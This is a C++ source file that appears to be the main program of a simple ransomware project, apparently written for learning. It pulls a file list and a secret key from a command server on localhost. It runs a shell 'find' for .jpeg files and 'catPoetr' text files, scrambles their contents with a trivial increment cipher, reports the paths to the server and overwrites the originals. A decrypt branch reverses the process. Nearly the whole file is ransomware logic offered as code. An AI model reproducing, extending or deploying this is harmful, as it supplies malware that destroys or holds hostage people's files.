#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include "headers/ransomFunctions.h"
#include "headers/json.hpp"


int main(){  
	std::vector<std::string> fileLocationsVector;
	//std::vector<std::vector<std::string>> fileContentVector;
	nlohmann::json j_complete = nlohmann::json::parse(get_request("http://127.0.0.1:5000/locations"));
	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");	
    std::vector<std::string> locationsToBeEncrypted;
    int count = 0; // TODO - change to bool?
    bool decrypt = false;

    // TODO - recursively map directories and find in not just local directories and sub directories.
	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.    

	// Reads the locations from the local fileLocation file into a string vector. Then reads contents into its own vector of string vectors.
	bool success = getFileContents("fileLocations", fileLocationsVector);
	
	// Puts server locations into a string vector.	
	std::vector<std::string> serverLocationsVector = jsonToStringVector(j_complete);	
	
	// Compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.
	locationsMinusServerLocations(locationsToBeEncrypted, fileLocationsVector, serverLocationsVector);

	


    
    
    std::vector<std::vector<std::string>> fileContentVector2 = fileContentRetreiver(serverLocationsVector);

    std::vector<std::vector<std::string>> fileContentVector3 = fileContentRetreiver(fileLocationsVector);

    std::vector<std::vector<std::string>> fileContentVector = fileContentRetreiver(locationsToBeEncrypted); // ?


 
    
    
	

    if(locationsToBeEncrypted.size() > 0){
	 	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
		for(auto& file: fileContentVector){
			for(auto& line : file){
				basicEncryptContent(line);
			}			
		}
		for(int i = 0 ; i < locationsToBeEncrypted.size(); i++){
			post_request(locationsToBeEncrypted[i]);
		}
		
		

		// UPDATE FILES - after the contents of the files have been encrypted. Replace contents of file with encrypted content.
		// TODO - Move to function
		std::ofstream myFile;
		for(int i = 0; i < fileContentVector.size(); i++){ 
			myFile.open(fileLocationsVector[i]);
			for(int j = 0; j < fileContentVector[i].size(); j++){ //loop through contents of files line by line.
				myFile << fileContentVector[i][j] << '\n';
				
			}
			myFile.close();			
		}	
    }

    if(decrypt){
	    // DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
		for(auto& file: fileContentVector2){
			for(auto& line : file){
				basicDecryptContent(line);
			}
		}  
		for(int i = 0 ; i < serverLocationsVector.size(); i++){
			
			delete_request(std::to_string(i + 1));
		}  
		

		// UPDATE FILES - after the contents of the files have been decrypted. Replace contents of file with encrypted content.
		// Move to function
		std::ofstream myFile;
		for(int i = 0; i < fileContentVector2.size(); i++){  
			myFile.open(serverLocationsVector[i]);
			for(int j = 0; j < fileContentVector2[i].size(); j++){ //loop through contents of files line by line.
				myFile << fileContentVector2[i][j] << '\n';
				
			}
			myFile.close();			
		}	

		
    }


	
    return 0;
}
